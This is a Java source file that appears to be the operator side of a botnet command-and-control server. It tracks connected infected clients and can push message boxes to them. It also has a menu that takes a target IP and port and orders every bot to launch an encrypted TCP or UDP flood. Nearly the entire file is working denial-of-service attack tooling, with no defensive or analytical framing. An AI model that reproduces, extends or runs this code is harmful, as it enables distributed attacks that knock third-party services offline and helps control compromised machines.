package me.kutuzov.server;

import me.kutuzov.packet.CSDAResPacket;
import me.kutuzov.packet.SCDAPacket;
import me.kutuzov.packet.SCMessageBoxPacket;
import me.kutuzov.server.client.Client;
import me.kutuzov.server.client.ClientManager;
import me.kutuzov.server.util.LoadingWheel;
import me.pk2.moodlyencryption.MoodlyEncryption;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import static me.kutuzov.server.KutuzovEnvironment.*;
import static me.kutuzov.server.util.ConsoleUtils.*;

public class KutuzovServer {
    public final ClientManager clientManager;
    private final LoadingWheel loadingWheel;
    private ServerSocket serverSocket;
    private Thread thread, checkThreadLoop;

    public KutuzovServer() {
        this.loadingWheel = new LoadingWheel();
        this.clientManager = new ClientManager();
    }

    public void boot() {
        loadingWheel.status.set("Booting server...");
        loadingWheel.showing.set(true);

        try {
            serverSocket = new ServerSocket(PORT);
        } catch (IOException exception) {
            loadingWheel.status.set("Failed to boot server!");
            loadingWheel.showing.set(false);
            exception.printStackTrace();

            return;
        }

        thread = new Thread(() -> {
            while(true) {
                Socket clientSocket;
                try {
                    clientSocket = serverSocket.accept();
                } catch (IOException exception) {
                    exception.printStackTrace();
                    continue;
                }

                Client client = clientManager.newClient(clientSocket);
                // pnl("Client connected(" + clientManager.clients.size() + "): " + client.getIp());
            }
        });
        thread.start();

        checkThreadLoop = new Thread(() -> {
            while(true) {
                trySleep(5000);
                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                    asyncRun(() -> {
                        try {
                            entry.getValue().getSocket().sendUrgentData(0x01);
                        } catch (Exception e) {
                            clientManager.clients.remove(entry.getKey());
                            // pnl("Client disconnected(" + clientManager.clients.size() + "): " + entry.getKey());
                        }});
            }
        });
        checkThreadLoop.start();

        loadingWheel.showing.set(false);
        trySleep(1000);
        clearConsole();
        pnl("Booting server... OK!");
        pnl("Listening on " + serverSocket.getInetAddress().getHostAddress() + ":" + serverSocket.getLocalPort());
        trySleep(3000);
        menu();
    }

    private void dos_options() {
        clearConsole();
        pnl("DOS options:");
        pnl("  0. Back");
        pnl("  1. TCP Flood");
        pnl("  2. UDP Flood");
        // pnl("  3. HTTP Flood");
        pnl("");
        pwl("Select option: ");

        String line = readLine();
        int option = line.contentEquals("0") ? 0 : Integer.parseInt(line);
        switch (option) {
            case 1: {
                clearConsole();
                pnl("TCP Flood attack:");
                pwl(" IP=");
                String ip = readLine();
                pwl(" Port=");
                int port = Integer.parseInt(readLine());
                String data = String.format("tcp;%s;%s", ip, port);

                try {
                    MoodlyEncryption encryption = new MoodlyEncryption();
                    String key = encryption.getKey();
                    String encryptedData = new String(encryption.encrypt(data)) + key;

                    for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                        asyncRun(() -> {
                            try {
                                ObjectOutputStream outputStream = entry.getValue().getOutput();
                                outputStream.writeObject(new SCDAPacket(encryptedData));

                                ObjectInputStream inputStream = entry.getValue().getInput();
                                CSDAResPacket resPacket = (CSDAResPacket) inputStream.readObject();

                                switch (resPacket.response) {
                                    case CSDAResPacket.RESPONSE_OK:
                                        pnl("Sent to " + entry.getKey());
                                        break;
                                    case CSDAResPacket.RESPONSE_ERROR:
                                        pnl("Error sending to " + entry.getKey());
                                        break;
                                    case CSDAResPacket.RESPONSE_BUSY:
                                        pnl(entry.getKey() + " is busy!");
                                        break;
                                }
                            } catch (Exception e) { pnl("Failed to send data to " + entry.getKey() + "! (" + e.getMessage() + ")"); }
                        });
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } break;
            case 2: {
                clearConsole();
                pnl("UDP Flood attack:");
                pwl(" IP=");
                String ip = readLine();
                pwl(" Port=");
                int port = Integer.parseInt(readLine());
                String data = String.format("udp;%s;%s", ip, port);

                try {
                    MoodlyEncryption encryption = new MoodlyEncryption();
                    String key = encryption.getKey();
                    String encryptedData = new String(encryption.encrypt(data)) + key;

                    for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                        asyncRun(() -> {
                            try {
                                ObjectOutputStream outputStream = entry.getValue().getOutput();
                                outputStream.writeObject(new SCDAPacket(encryptedData));

                                ObjectInputStream inputStream = entry.getValue().getInput();
                                CSDAResPacket resPacket = (CSDAResPacket) inputStream.readObject();

                                switch (resPacket.response) {
                                    case CSDAResPacket.RESPONSE_OK:
                                        pnl("Sent to " + entry.getKey());
                                        break;
                                    case CSDAResPacket.RESPONSE_ERROR:
                                        pnl("Error sending to " + entry.getKey());
                                        break;
                                    case CSDAResPacket.RESPONSE_BUSY:
                                        pnl(entry.getKey() + " is busy!");
                                        break;
                                }
                            } catch (Exception e) { pnl("Failed to send data to " + entry.getKey() + "! (" + e.getMessage() + ")"); }
                        });
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } break;
            /*case 3: {

            } break;*/
            case 0: return;
            default:
                dos_options();
                break;
        }
    }

    private void menu() {
        clearConsole();
        pnl("Connected clients: " + clientManager.clients.size());
        pnl("Select action:");
        pnl("  0) Refresh");
        pnl("  1) MessageBox all clients");
        pnl("  2) Dos options");
        pnl("  9) Stop server & exit");
        pnl("");
        pwl("Select action: ");

        String line = readLine();
        int option = line.contentEquals("")?0:Integer.parseInt(line);
        switch (option) {
            case 1:
                clearConsole();
                pwl("Enter the title: ");
                String title = readLine();
                pwl("Enter the content: ");
                String content = readLine();

                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                    asyncRun(() -> {
                        try {
                            ObjectOutputStream objectOutputStream = entry.getValue().getOutput();
                            objectOutputStream.writeObject(new SCMessageBoxPacket(title, content));
                        } catch (Exception e) { e.printStackTrace(); }});
                menu();
                break;
            case 2:
                dos_options();
                menu();
                break;

            case 9:
                System.exit(0);
                break;
            case 0:
            default: menu();
        }
    }
}